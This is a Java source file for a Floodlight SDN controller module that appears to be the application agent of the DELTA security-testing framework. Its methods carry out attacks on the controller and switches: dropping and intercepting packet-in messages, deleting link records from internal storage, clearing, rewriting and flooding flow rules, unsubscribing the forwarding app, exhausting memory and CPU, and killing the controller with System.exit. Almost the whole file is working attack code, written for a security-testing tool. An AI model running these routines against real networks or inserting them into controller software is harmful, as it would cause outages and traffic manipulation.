package org.deltaproject.appagent;

import net.floodlightcontroller.core.*;
import net.floodlightcontroller.core.module.FloodlightModuleContext;
import net.floodlightcontroller.core.module.FloodlightModuleException;
import net.floodlightcontroller.core.module.IFloodlightModule;
import net.floodlightcontroller.core.module.IFloodlightService;
import net.floodlightcontroller.devicemanager.IDeviceService;
import net.floodlightcontroller.linkdiscovery.ILinkDiscovery;
import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryListener;
import net.floodlightcontroller.linkdiscovery.ILinkDiscoveryService;
import net.floodlightcontroller.packet.Ethernet;
import net.floodlightcontroller.packet.IPacket;
import net.floodlightcontroller.packet.IPv4;
import net.floodlightcontroller.staticflowentry.IStaticFlowEntryPusherService;
import net.floodlightcontroller.storage.IResultSet;
import net.floodlightcontroller.storage.IStorageSourceService;
import net.floodlightcontroller.storage.memory.MemoryStorageSource;
import net.floodlightcontroller.topology.TopologyManager;
import org.openflow.protocol.*;
import org.openflow.protocol.Wildcards.Flag;
import org.openflow.protocol.action.OFAction;
import org.openflow.protocol.action.OFActionOutput;
import org.openflow.protocol.statistics.OFFlowStatisticsReply;
import org.openflow.protocol.statistics.OFFlowStatisticsRequest;
import org.openflow.protocol.statistics.OFStatistics;
import org.openflow.protocol.statistics.OFStatisticsType;
import org.openflow.util.HexString;

import java.util.*;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

public class AppAgent implements IFloodlightModule, IOFMessageListener, ILinkDiscoveryListener, IOFSwitchListener {

    public void linkDiscoveryUpdate(LDUpdate update) {

    }

    public void linkDiscoveryUpdate(List<LDUpdate> updateList) {

    }

    public void switchAdded(long switchId) {

    }

    public void switchRemoved(long switchId) {

    }

    public void switchActivated(long switchId) {

    }

    public void switchPortChanged(long switchId, ImmutablePort port, IOFSwitch.PortChangeType type) {

    }

    public void switchChanged(long switchId) {

    }

    class CPU extends Thread {
        int result = 1;

        @Override
        public void run() {
            // TODO Auto-generated method stub
            while (true) {
                // try {
                // Thread.sleep(1);
                // } catch (InterruptedException e) {
                // // TODO Auto-generated catch block
                // e.printStackTrace();
                // }
                result = result ^ 2;
            }
        }
    }

    private short FLOWMOD_DEFAULT_IDLE_TIMEOUT = (short) 0;
    private short FLOWMOD_DEFAULT_HARD_TIMEOUT = (short) 0;

    protected IFloodlightProviderService floodlightProvider;
    protected TopologyManager topoManager;
    protected IStorageSourceService storageSource;
    protected IDeviceService dservice;

    protected MemoryStorageSource mt;
    static long[][] ary;
    protected OFFlowMod benign_flow;
    protected short benign_inport;

    // for DELTA
    private boolean isDrop;
    private OFPacketIn droppedPacket;
    private boolean isLoop;
    private boolean isRemovedPayload;
    private SystemTime sys;
    private HashMap<String, Integer> map = new HashMap<String, Integer>();

    private IStaticFlowEntryPusherService fservice;
    private AMInterface cm;

    private int cntSwitch;
    private int cntLink;

    public String getName() {
        // TODO Auto-generated method stub
        return AppAgent.class.getSimpleName();
    }

    public boolean isCallbackOrderingPrereq(OFType type, String name) {
        return false;
    }

    public boolean isCallbackOrderingPostreq(OFType type, String name) {
        return false;
    }

    @Override
    public Collection<Class<? extends IFloodlightService>> getModuleServices() {
        Collection<Class<? extends IFloodlightService>> l = new ArrayList<Class<? extends IFloodlightService>>();
        // l.add(ILinkDiscoveryService.class);
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public Map<Class<? extends IFloodlightService>, IFloodlightService> getServiceImpls() {

        // TODO Auto-generated method stub
        // Map<Class<? extends IFloodlightService>, IFloodlightService> m = new
        // HashMap<Class<? extends IFloodlightService>, IFloodlightService>();
        // m.put(ILinkDiscoveryService.class, this);
        return null;
    }

    @Override
    public Collection<Class<? extends IFloodlightService>> getModuleDependencies() {
        Collection<Class<? extends IFloodlightService>> l = new ArrayList<Class<? extends IFloodlightService>>();
        l.add(IFloodlightProviderService.class);
        l.add(ILinkDiscoveryService.class);
        return l;
    }

    @Override
    public void init(FloodlightModuleContext context) throws FloodlightModuleException {
        // TODO Auto-generated method stub
        storageSource = context.getServiceImpl(IStorageSourceService.class);
        topoManager = context.getServiceImpl(TopologyManager.class);
        mt = context.getServiceImpl(MemoryStorageSource.class);
        floodlightProvider = context.getServiceImpl(IFloodlightProviderService.class);
        dservice = context.getServiceImpl(IDeviceService.class);
        fservice = context.getServiceImpl(IStaticFlowEntryPusherService.class);

        cm = new AMInterface(this);
        cm.setServerAddr();
        cm.connectServer("AppAgent");
        cm.start();
    }

    @Override
    public void startUp(FloodlightModuleContext context) throws FloodlightModuleException {
        // TODO Auto-generated method stub
        floodlightProvider.addOFMessageListener(OFType.BARRIER_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.BARRIER_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.ECHO_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.ECHO_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.ERROR, this);
        floodlightProvider.addOFMessageListener(OFType.FEATURES_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.FEATURES_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.FLOW_MOD, this);
        floodlightProvider.addOFMessageListener(OFType.FLOW_REMOVED, this);
        floodlightProvider.addOFMessageListener(OFType.GET_CONFIG_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.GET_CONFIG_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.HELLO, this);
        floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);

        floodlightProvider.addOFMessageListener(OFType.PACKET_OUT, this);
        floodlightProvider.addOFMessageListener(OFType.PORT_MOD, this);
        floodlightProvider.addOFMessageListener(OFType.PORT_STATUS, this);
        floodlightProvider.addOFMessageListener(OFType.QUEUE_GET_CONFIG_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.QUEUE_GET_CONFIG_REQUEST, this);
        floodlightProvider.addOFMessageListener(OFType.SET_CONFIG, this);
        floodlightProvider.addOFMessageListener(OFType.STATS_REPLY, this);
        floodlightProvider.addOFMessageListener(OFType.STATS_REQUEST, this);

        getUpdatedState();
    }

    public boolean setControlMessageDrop() {
        System.out.println("[AppAgent] Control_Message_Drop");
        isDrop = true;

        List<IOFMessageListener> listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);

        IOFMessageListener temp = null;
        for (IOFMessageListener listen : listeners) {
            if (listen.getName().equals("AppAgent")) {
                temp = listen;
            }

            floodlightProvider.removeOFMessageListener(OFType.PACKET_IN, listen);
        }

        for (IOFMessageListener listen : listeners) {
            floodlightProvider.addOFMessageListener(OFType.PACKET_IN, temp);
            if (!listen.getName().equals("AppAgent")) {
                floodlightProvider.addOFMessageListener(OFType.PACKET_IN, listen);
            }
        }

        listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);

        for (IOFMessageListener listen : listeners) {
            System.out.println(listen.getName());
        }

        return true;
    }

    public String testControlMessageDrop() {
        System.out.println("[AppAgent] Control_Message_Drop");
        String drop = "nothing";

        for (int i = 0; i < 10; i++) {
            while (this.droppedPacket == null) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

        if (droppedPacket != null) {
            drop = droppedPacket.toString();
        }

        return drop;
    }

    public boolean setInfiniteLoop() {
        System.out.println("[AppAgent] Set_Infinite_Loop");
        this.isLoop = true;

        return true;
    }

    public static boolean Infinite_Loop() {
        System.out.println("[AppAgent] Infinite_Loop");
        int i = 0;

        while (i < 100) {
            i++;

            if (i == 99)
                i = 0;
        }

        return true;
    }

    public String testInternalStorageAbuse() {
        System.out.println("[ATTACK] Internal Storage Manipulation");
        String deletedInfo = "nothing";

        IResultSet link = storageSource.executeQuery(InternalDBShow.LINK_TABLE_NAME, null, null, null);
        int count = 0;
        List<String> linkIdList = new LinkedList<String>();

        InternalDBShow.show(storageSource);

        while (link.next()) {
            try {
                count++;
                linkIdList.add(link.getString(InternalDBShow.LINK_ID));
            } catch (NullPointerException e) {
                e.printStackTrace();
            }
        }

        if (linkIdList.size() == 0)
            return deletedInfo;

        deletedInfo = "success|";
        for (int i = 0; i < count; i++) {
            System.out.println("[ATTACK] Access InternalDB : delete Link Information");
            System.out.println("[ATTACK] delete Link Info: " + linkIdList.get(i));
            storageSource.deleteRow(InternalDBShow.LINK_TABLE_NAME, linkIdList.get(i));
            deletedInfo += linkIdList.get(i).toString() + "\n";
        }

        InternalDBShow.show(storageSource);
        return deletedInfo;
    }

    public String testFlowRuleModification() {
        System.out.println("[AppAgent] Flow_Rule_Modification");

        String result = "";

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
        for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
            switches.add(entry.getValue());
        }

        for (IOFSwitch sw : switches) {
            List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw, (short) -1);
            System.out.println("Table size : " + flowTable.size());
            for (OFFlowStatisticsReply flow : flowTable) {
                System.out.println(flow);

                List<OFAction> actions = new ArrayList<OFAction>();
                actions.add(new OFActionOutput().setMaxLength((short) 0xffff));

                OFMatch match = flow.getMatch().clone();
                match.setWildcards(flow.getMatch().clone().getWildcards());

                OFMessage fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
                        .setMatch(match).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_DELETE)
                        .setActions(actions)
                        .setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));

                OFMessage fm2 = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
                        .setMatch(match).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_ADD).setActions(actions)
                        .setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));

                try {
                    List<OFMessage> msglist = new ArrayList<OFMessage>(2);
                    msglist.add(fm);
                    msglist.add(fm2);
                    sw.write(msglist, null);
                    sw.flush();

                    result = "success|" + fm.toString() + "->" + fm2.toString();
                } catch (Exception e) {
                    System.out.println("Failed to clear flows on switch {} - {}" + e);
                }
            }
        }

        return result;
    }

    public void testFlowTableClearance(boolean isLoop) {
        System.out.println("[AppAgent] Flow_Table_Clearance");

        int cnt = 1;

		/* forever */
        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
        for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
            switches.add(entry.getValue());
        }

        for (int i = 0; i < cnt; i++) {

            for (IOFSwitch sw : switches) {
                // sw.clearAllFlowMods();
                // fservice.deleteAllFlows();
                List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw, (short) -1);
                for (OFFlowStatisticsReply flow : flowTable) {
                    System.out.println(flow);

                    List<OFAction> actions = new ArrayList<OFAction>();
                    actions.add(new OFActionOutput().setMaxLength((short) 0xffff));

                    OFMatch match = flow.getMatch().clone();
                    match.setWildcards(flow.getMatch().clone().getWildcards());

                    OFMessage fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
                            .setMatch(match).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_DELETE)
                            .setActions(actions)
                            .setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));

                    try {
                        List<OFMessage> msglist = new ArrayList<OFMessage>(1);
                        msglist.add(fm);
                        sw.write(msglist, null);
                        sw.flush();
                    } catch (Exception e) {
                        System.out.println("Failed to clear flows on switch {} - {}" + e);
                    }
                }

                if (isLoop)
                    i = -1;
            }
        }
    }

    public String testEventListenerUnsubscription() {
        List<IOFMessageListener> listeners = floodlightProvider.getListeners().get(OFType.PACKET_IN);

        String removed = "";
        for (IOFMessageListener listen : listeners) {
            System.out.println("[ATTACK] PACKET_IN LIST");
            System.out.println("[ATTACK] " + listen.getName());
        }

        for (IOFMessageListener listen : listeners) {
            if (listen.getName().equals("forwarding")) {
                System.out.println("\n\n[ATTACK] REMOVE: " + listen.getName());

                removed = "forwarding";
                floodlightProvider.removeOFMessageListener(OFType.PACKET_IN, listen);
            }
        }
        return removed;
    }

    public void testResourceExhaustionMem() {
        System.out.println("[AppAgent] Resource Exhausion : Mem");
        ArrayList<long[][]> arry;
        // ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
        arry = new ArrayList<long[][]>();
        while (true) {
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
        }
    }

    public boolean testResourceExhaustionCPU() {
        System.out.println("[AppAgent] Resource Exhausion : CPU");
        int thread_count = 0;

        for (int count = 0; count < 100; count++) {
            CPU cpu_thread = new CPU();
            cpu_thread.start();
            thread_count++;
        }

        return true;
    }

    public boolean testSystemVariableManipulation() {
        System.out.println("[AppAgent] System_Variable_Manipulation");
        this.sys = new SystemTime();
        sys.start();
        return true;
    }

    public boolean testSystemCommandExecution() {
        System.out.println("[AppAgent] System_Command_Execution");
        System.exit(0);

        return true;
    }

    public String testLinkFabrication() {
        System.out.println("[ATTACK] Link Fabrication");
        String fakeLinks = "";

        boolean a = false, b = false;

        IResultSet link = storageSource.executeQuery(InternalDBShow.LINK_TABLE_NAME, null, null, null);
        int count = 0;
        List<String> linkIdList = new LinkedList<String>();

        while (link.next()) {
            try {
                count++;
                linkIdList.add(link.getString(InternalDBShow.LINK_ID));
            } catch (NullPointerException e) {
                e.printStackTrace();
            }
        }

        if (count != 0) {
            for (int i = 0; i < count; i++) {
                System.out.println("[ATTACK] delete Link Info: " + linkIdList.get(i));

                if (linkIdList.get(i).toString().equals("00:00:00:00:00:00:00:01-2-00:00:00:00:00:00:00:03-2")) {
                    fakeLinks += linkIdList.get(i).toString() + "\n";
                    a = true;
                }

                if (linkIdList.get(i).toString().equals("00:00:00:00:00:00:00:03-2-00:00:00:00:00:00:00:01-2")) {
                    fakeLinks += linkIdList.get(i).toString() + "\n";
                    b = true;
                }
            }
        }

        if (a && b) {
            fakeLinks = "success|\n Fake links: " + fakeLinks;
        } else
            fakeLinks = "nothing";

        return fakeLinks;
    }

    public boolean testFlowRuleFlooding() {
        System.out.println("[AppAgent] Flow_Rule_Flooding");

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
        for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
            switches.add(entry.getValue());
        }

        Random random = new Random();

        OFMatch match = new OFMatch();
        match.setDataLayerSource("ff:ff:ff:ff:ff:ff");
        match.setDataLayerDestination("ff:ff:ff:ff:ff:ff");

        for (int i = 0; i < 32767; i++) {
            OFFlowMod fm = (OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);

            // short inPort = 0;

            List<OFAction> actions = new ArrayList<OFAction>();
            actions.add(new OFActionOutput().setMaxLength((short) 0xffff));

            fm.setIdleTimeout(FLOWMOD_DEFAULT_IDLE_TIMEOUT).setHardTimeout(FLOWMOD_DEFAULT_HARD_TIMEOUT)
                    .setBufferId(OFPacketOut.BUFFER_ID_NONE).setCookie(random.nextInt()).setCommand(OFFlowMod.OFPFC_ADD)
                    .setActions(actions).setPriority((short) random.nextInt(32767))
                    .setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));

            fm.setMatch(match.clone().setWildcards(Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE)
                    .matchOn(Flag.DL_SRC).matchOn(Flag.DL_DST)));

            // set input and output ports on the switch
            // fm.getMatch().setInputPort(inPort);

            try {
                for (IOFSwitch sw : switches) {
                    sw.write(fm, null);
                    sw.flush();
                }
            } catch (Exception e) {

            }
        }

        return true;
    }

    public String testSwitchFirmwareMisuse() {
        String result = "";

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
        for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
            switches.add(entry.getValue());
        }

        for (IOFSwitch sw : switches) {
            List<OFFlowStatisticsReply> flowTable = getSwitchFlowTable(sw, (short) -1);
            // System.out.println("Table size : " + flowTable.size());
            for (OFFlowStatisticsReply flow : flowTable) {
                // System.out.println(flow);

                List<OFAction> actions = new ArrayList<OFAction>();
                actions.add(new OFActionOutput().setMaxLength((short) 0xffff));

                int dst = 0;
                int src = 0;

                String srcS = HexString.toHexString(flow.getMatch().getDataLayerSource());
                String dstS = HexString.toHexString(flow.getMatch().getDataLayerDestination());
                dst = map.get(dstS);
                src = map.get(srcS);

                OFMatch newmatch = flow.getMatch().clone();
                newmatch.setDataLayerType((short) 0x800);
                newmatch.setNetworkDestination(dst);
                newmatch.setNetworkSource(src);
                newmatch.setWildcards(
                        Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE).withNwSrcMask(32).withNwDstMask(32));

                OFMessage fm = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
                        .setMatch(flow.getMatch().clone()).setCookie(flow.getCookie())
                        .setCommand(OFFlowMod.OFPFC_DELETE);

                OFMessage fm2 = ((OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD))
                        .setMatch(newmatch).setCookie(flow.getCookie()).setCommand(OFFlowMod.OFPFC_ADD)
                        .setActions(flow.getActions()).setLengthU(
                                OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * flow.getActions().size()));

                try {
                    List<OFMessage> msglist = new ArrayList<OFMessage>(2);
                    msglist.add(fm);
                    msglist.add(fm2);
                    sw.write(msglist, null);
                    sw.flush();

                    result = "success|" + fm.toString() + "\n->" + fm2.toString();
                    System.out.println("[ATTACK] " + result);
                } catch (Exception e) {
                    System.out.println("Failed to clear flows on switch {} - {}" + e);
                }
            }
        }

        return result;
    }

    public String sendUnFlaggedFlowRemoveMsg() {
        System.out.println("[AppAgent] Send UnFlagged Flow Remove Message");

        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
        for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
            switches.add(entry.getValue());
        }

        Random random = new Random();

        OFMatch match = new OFMatch();
        match.setDataLayerSource("ff:ff:ff:ff:ff:ff");
        match.setDataLayerDestination("ff:ff:ff:ff:ff:ff");

        OFFlowMod fm = (OFFlowMod) floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);

        List<OFAction> actions = new ArrayList<OFAction>();
        actions.add(new OFActionOutput().setMaxLength((short) 0xffff));

        fm.setIdleTimeout(FLOWMOD_DEFAULT_IDLE_TIMEOUT).setHardTimeout(FLOWMOD_DEFAULT_HARD_TIMEOUT)
                .setBufferId(OFPacketOut.BUFFER_ID_NONE).setCookie(random.nextInt()).setCommand(OFFlowMod.OFPFC_ADD)
                .setActions(actions).setPriority((short) random.nextInt(32767))
                .setLengthU(OFFlowMod.MINIMUM_LENGTH + (OFActionOutput.MINIMUM_LENGTH * actions.size()));

        fm.setMatch(match.clone().setWildcards(Wildcards.FULL.matchOn(Flag.IN_PORT).matchOn(Flag.DL_TYPE)
                .matchOn(Flag.DL_SRC).matchOn(Flag.DL_DST)));

        // set input and output ports on the switch
        fm.getMatch().setInputPort((short) 1);

        try {
            for (IOFSwitch sw : switches) {
                sw.write(fm, null);
                sw.flush();
            }
        } catch (Exception e) {

        }

        return fm.toString();
    }


    // Get flow table in the switch
    public List<OFFlowStatisticsReply> getSwitchFlowTable(IOFSwitch sw, Short outPort) {
        List<OFFlowStatisticsReply> statsReply = new ArrayList<OFFlowStatisticsReply>();
        List<OFStatistics> values = null;
        Future<List<OFStatistics>> future;

        // Statistics request object for getting flows
        OFStatisticsRequest req = new OFStatisticsRequest();
        req.setStatisticType(OFStatisticsType.FLOW);
        int requestLength = req.getLengthU();

        OFFlowStatisticsRequest specificReq = new OFFlowStatisticsRequest();

        specificReq.setMatch(new OFMatch().setWildcards(-1));
        specificReq.setOutPort(outPort);
        specificReq.setTableId((byte) 0xff);

        req.setStatistics(Collections.singletonList((OFStatistics) specificReq));
        requestLength += specificReq.getLength();
        req.setLengthU(requestLength);

        try {
            future = sw.queryStatistics(req);
            values = future.get(10, TimeUnit.SECONDS);
            if (values != null) {
                for (OFStatistics stat : values) {
                    // System.out.println("stats : " + stat);
                    statsReply.add((OFFlowStatisticsReply) stat);
                }
            }
        } catch (Exception e) {
            System.out.println("Failure retrieving statistics from switch " + sw);
        }

        return statsReply;
    }

    public void testSwappingList() {
        List<IOFMessageListener> packetin_listeners = floodlightProvider
                .getListeners().get(OFType.PACKET_IN);

        System.out.println("[ATTACK] List of Packet-In Listener: " + packetin_listeners.size());

        int cnt = 1;

        for (IOFMessageListener listen : packetin_listeners) {
            System.out.println("[ATTACK] " + (cnt++) + " [" + listen.getName() + "] APPLICATION");
        }

        IOFMessageListener temp = packetin_listeners.get(0);
        packetin_listeners.set(packetin_listeners.size() - 1, temp);
        packetin_listeners.set(0, this);

        cnt = 1;

        System.out.println("[ATTACK] List of Packet-In Listener: " + packetin_listeners.size());

        for (IOFMessageListener listen : packetin_listeners) {
            System.out.println("[ATTACK] " + (cnt++) + " [" + listen.getName() + "] APPLICATION");
        }

        isRemovedPayload = true;
    }

    public String getUpdatedState() {
        int cntsw = 0;
        int cntlink = 0;

        String result = "empty";

        // for switch update
        List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
        Map<Long, IOFSwitch> switchMap = floodlightProvider.getAllSwitchMap();
        for (java.util.Map.Entry<Long, IOFSwitch> entry : switchMap.entrySet()) {
            switches.add(entry.getValue());
        }

        cntsw = switches.size();

        // for link update
        IResultSet link = storageSource.executeQuery(InternalDBShow.LINK_TABLE_NAME, null, null, null);
        List<String> links = new LinkedList<String>();
        while (link.next()) {
            try {
                links.add(link.getString(InternalDBShow.LINK_ID));
            } catch (NullPointerException e) {
                e.printStackTrace();
            }
        }

        cntlink = links.size();

        if(cntsw != cntSwitch) {
            result = "switch updated";
            cntSwitch = cntsw;
        }

        if(cntlink != cntLink) {
            result += "link updated";
            cntLink = cntlink;
        }

        return result;
    }

    @Override
    public Command receive(IOFSwitch sw, OFMessage msg, FloodlightContext cntx) {
        // TODO Auto-generated method stub
        switch (msg.getType()) {
            case PACKET_IN:
                OFPacketIn pi = (OFPacketIn) msg;

                Ethernet eth = IFloodlightProviderService.bcStore.get(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);

                IPacket pkt = eth.getPayload();
                IPv4 ip_pkt = null;

                if (pkt instanceof IPv4) {
                    ip_pkt = (IPv4) pkt;

                    map.put(HexString.toHexString(eth.getDestinationMACAddress()), ip_pkt.getDestinationAddress());
                    map.put(HexString.toHexString(eth.getSourceMACAddress()), ip_pkt.getSourceAddress());

                }

                if (isDrop) {
                    if (droppedPacket == null)
                        droppedPacket = pi;

                    return Command.STOP;
                } else if (isLoop) {
                    this.Infinite_Loop();
                } else if (isRemovedPayload) {
                    IFloodlightProviderService.bcStore.remove(cntx, IFloodlightProviderService.CONTEXT_PI_PAYLOAD);
                }

                return Command.CONTINUE;
        }
        return Command.CONTINUE;
    }
}
